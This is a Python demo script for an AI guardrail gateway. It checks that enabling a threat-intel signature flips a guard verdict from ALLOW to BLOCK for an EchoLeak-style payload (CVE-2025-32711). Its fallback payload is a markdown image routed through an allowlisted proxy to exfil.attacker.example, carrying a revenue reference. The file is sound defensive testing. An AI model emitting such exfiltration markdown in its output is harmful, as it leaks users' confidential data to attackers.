"""Scripted F8 demo + preflight: `python -m aegis.feed.demo echoleak|check [--gateway URL] [--feed URL]`.

echoleak          POST /v1/guard (model.response, EchoLeak proxy payload) -> ALLOW on feed v1,
                  enable AEGIS-TI-022 + publish on the feed service, wait for the gateway serial
                  bump (prints activation ms), guard again -> BLOCK SIG-01 AEGIS-TI-022.
echoleak --reset  disable AEGIS-TI-022 and republish (back to ALLOW).
echoleak --surface tool.input
                  fallback flip on `Write report.md` if DLP-06 strips the image on responses.
check             preflight: feed + gateway reachable, key ids equal, serials in sync.
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path
from typing import Any

import httpx

PAYLOAD_FILE = (
    Path(__file__).resolve().parents[3] / "feed_service" / "demo" / "echoleak-proxy-payload.md"
)
SIG = "AEGIS-TI-022"
C = {
    "g": "\033[32m",
    "r": "\033[31m",
    "y": "\033[33m",
    "b": "\033[1m",
    "d": "\033[2m",
    "x": "\033[0m",
}
if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
    C = dict.fromkeys(C, "")


def _payload() -> str:
    try:
        return PAYLOAD_FILE.read_text(encoding="utf-8")
    except OSError:
        return (
            "Q3 summary attached.\n\n![chart](https://assets.acme-capital.example/img/proxy?"
            "src=https://exfil.attacker.example/c.png&ref=UECB3F2A9-Q3-REVENUE)\n"
        )


def _admin_headers() -> dict[str, str]:
    tok = os.environ.get("AEGIS_ADMIN_TOKEN")
    return {"authorization": f"Bearer {tok}"} if tok else {}


def guard(c: httpx.Client, gw: str, surface: str) -> dict:
    text = _payload()
    if surface == "tool.input":
        inter: dict[str, Any] = {
            "kind": "tool_call",
            "surface": "tool.input",
            "destination": "local",
            "tool_name": "Write",
            "tool_args": {"file_path": "report.md", "content": text},
        }
    else:
        inter = {
            "kind": "model_call",
            "surface": "model.response",
            "direction": "in",
            "destination": "remote",
            "text": text,
        }
    r = c.post(f"{gw}/v1/guard", json={"interaction": inter, "session_id": "feed-demo"})
    r.raise_for_status()
    return r.json()


def _describe(res: dict) -> tuple[str, str]:
    v = res.get("verdict") or res
    action = str(v.get("action", "?"))
    p = v.get("primary") or {}
    who = p.get("control_id") or ""
    reason = p.get("reason") or ""
    return action, f"{who} {reason}".strip() + (
        f"  (feed #{v.get('feed_serial')})" if v.get("feed_serial") else ""
    )


def _print_verdict(label: str, res: dict) -> str:
    action, why = _describe(res)
    col = C["r"] if action == "block" else C["g"] if action == "allow" else C["y"]
    print(f"  {label:7} {col}{C['b']}{action.upper():8}{C['x']} {why}")
    return action


def feed_status(c: httpx.Client, gw: str) -> dict:
    r = c.get(f"{gw}/api/feed/status", headers=_admin_headers())
    r.raise_for_status()
    return r.json()


def cmd_echoleak(args: argparse.Namespace) -> int:
    gw, feed = args.gateway.rstrip("/"), args.feed.rstrip("/")
    with httpx.Client(timeout=10.0) as c:
        try:
            st = feed_status(c, gw)
            c.get(f"{feed}/healthz", timeout=2.0).raise_for_status()
        except httpx.HTTPError as e:
            print(f"{C['r']}gateway or feed service unreachable: {e}{C['x']}", file=sys.stderr)
            return 2
        enable = not args.reset
        print(
            f"{C['b']}F8 · EchoLeak via an allowlisted image proxy (CVE-2025-32711){C['x']}  "
            f"gateway feed #{st.get('serial')} ({st.get('status')})"
        )
        before = _print_verdict("before", guard(c, gw, args.surface))
        c.post(f"{feed}/api/signatures/{SIG}/enabled", json={"enabled": enable}).raise_for_status()
        t0 = time.perf_counter()
        r = c.post(
            f"{feed}/api/publish", json={"note": f"demo: {'enable' if enable else 'disable'} {SIG}"}
        )
        if r.status_code != 200:
            print(
                f"{C['r']}publish failed: HTTP {r.status_code} {r.text[:200]}{C['x']}",
                file=sys.stderr,
            )
            return 1
        serial = r.json()["serial"]
        print(
            f"  publish {C['d']}{'enabled' if enable else 'disabled'} {SIG} -> feed serial #{serial} "
            f"(signed, {r.json().get('vectors')} vectors){C['x']}"
        )
        deadline = time.monotonic() + args.timeout
        got = None
        while time.monotonic() < deadline:
            got = feed_status(c, gw)
            if got.get("serial") == serial:
                break
            time.sleep(0.05)
        ms = (time.perf_counter() - t0) * 1000
        if not got or got.get("serial") != serial:
            print(
                f"{C['r']}gateway did not activate #{serial} within {args.timeout}s "
                f"(status {got and got.get('status')}: {got and got.get('last_error')}){C['x']}"
            )
            return 1
        print(f"  gateway {C['g']}verified + activated #{serial} in {ms:.0f} ms{C['x']}")
        after = _print_verdict("after", guard(c, gw, args.surface))
    want_after = "allow" if args.reset else "block"
    ok = after == want_after or (args.reset and after in ("allow", "log", "redact"))
    if not args.reset and before == "block":
        print(
            f"{C['y']}note: payload was already blocked before the flip (is {SIG} already enabled? "
            f"run with --reset first){C['x']}"
        )
    return 0 if ok else 1


def cmd_check(args: argparse.Namespace) -> int:
    gw, feed = args.gateway.rstrip("/"), args.feed.rstrip("/")
    ok = True
    with httpx.Client(timeout=3.0) as c:
        try:
            fs = c.get(f"{feed}/api/state").json()
        except (httpx.HTTPError, ValueError) as e:
            print(f"FAIL feed service {feed}: {type(e).__name__}")
            return 1
        try:
            gs = feed_status(c, gw)
        except (httpx.HTTPError, ValueError) as e:
            print(f"FAIL gateway {gw}: {type(e).__name__}")
            return 1
        try:
            rows = c.get(f"{feed}/api/signatures").json().get("items", [])
        except (httpx.HTTPError, ValueError):
            rows = []
    draft = next((r for r in rows if r.get("id") == SIG), {})
    checks = [
        ("feed service up", True, f"serial #{fs.get('serial')} key {fs.get('key_id')}"),
        (
            "gateway feed status",
            gs.get("status") in ("ok", "seed"),
            f"{gs.get('status')} {gs.get('last_error') or ''}".strip(),
        ),
        (
            "pinned key == signing key",
            gs.get("key_id") == fs.get("key_id"),
            f"gateway {gs.get('key_id')} / feed {fs.get('key_id')}",
        ),
        (
            "serial in sync",
            gs.get("serial") == fs.get("serial"),
            f"gateway #{gs.get('serial')} / feed #{fs.get('serial')}",
        ),
    ]
    for name, good, detail in checks:
        ok &= bool(good)
        print(f"{'PASS' if good else 'FAIL'} {name}: {detail}")
    if draft.get("enabled"):
        print(
            f"WARN {SIG} is already enabled: run `python -m aegis.feed.demo echoleak --reset` "
            "for the ALLOW -> BLOCK flip"
        )
    return 0 if ok else 1


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        prog="python -m aegis.feed.demo",
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument(
        "--gateway", default=os.environ.get("AEGIS_GATEWAY_URL", "http://127.0.0.1:8787")
    )
    ap.add_argument(
        "--feed", default=os.environ.get("AEGIS_FEED_SERVICE_URL", "http://127.0.0.1:8790")
    )
    sub = ap.add_subparsers(dest="cmd", required=True)
    e = sub.add_parser("echoleak")
    e.add_argument("--reset", action="store_true", help="disable AEGIS-TI-022 and republish")
    e.add_argument("--surface", choices=["model.response", "tool.input"], default="model.response")
    e.add_argument("--timeout", type=float, default=15.0)
    sub.add_parser("check")
    args = ap.parse_args(argv)
    return {"echoleak": cmd_echoleak, "check": cmd_check}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
